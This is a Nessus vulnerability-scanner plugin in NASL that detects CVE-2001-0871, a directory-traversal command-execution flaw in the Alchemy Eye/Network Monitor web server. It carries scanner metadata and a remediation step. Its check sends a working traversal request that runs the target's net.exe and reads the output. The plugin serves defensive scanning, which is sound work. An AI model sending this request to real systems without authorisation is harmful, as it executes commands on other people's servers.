#
# This script was written by Drew Hintz ( http://guh.nu )
#
# It is based on scripts written by Renaud Deraison and  HD Moore
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Description whitespace touch-up, added see-also (3/15/10)

include("compat.inc");

if (description)
{
 script_id(10818);
 script_version("$Revision: 1.24 $");
 script_cvs_date("$Date: 2014/01/07 21:38:30 $");

 script_cve_id("CVE-2001-0871");
 script_bugtraq_id(3599);
 script_osvdb_id(684);

 script_name(english:"Alchemy Eye/Network Monitor Traversal Arbitrary Command Execution");
 script_summary(english:"Determine if arbitrary commands can be executed by Alchemy Eye");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote command execution
vulnerability.");
 script_set_attribute(attribute:"description", value:
"Alchemy Eye and Alchemy Network Monitor are network management tools
for Microsoft Windows. The product contains a built-in HTTP server for
remote monitoring and control. This HTTP server allows arbitrary
commands to be run on the server by a remote attacker.");
 script_set_attribute(attribute:"see_also", value:"http://www.rapid7.com/security-center/advisories/R7-0001.jsp");
 script_set_attribute(attribute:"solution", value:
"Either disable HTTP access in Alchemy Eye, or require authentication
for Alchemy Eye. Both of these can be set in the Alchemy Eye
preferences.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/11/29");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/12/03");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2014 H D Moore & Drew Hintz ( http://guh.nu )");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_keys("www/alchemy");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

function check(req)
{
 local_var r, pat;

 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if ( r == NULL ) exit(0);
 pat = "ACCOUNTS | COMPUTER";
 if(pat >< r) {
   	security_hole(port:port);
	exit(0);
 	}
 return(0);
}

dir[0] = "/PRN";
dir[1] = "/NUL";
dir[2] = "";

for(d=0;dir[d];d=d+1)
{
	url = string("/cgi-bin", dir[d], "/../../../../../../../../WINNT/system32/net.exe");
	check(req:url);
}
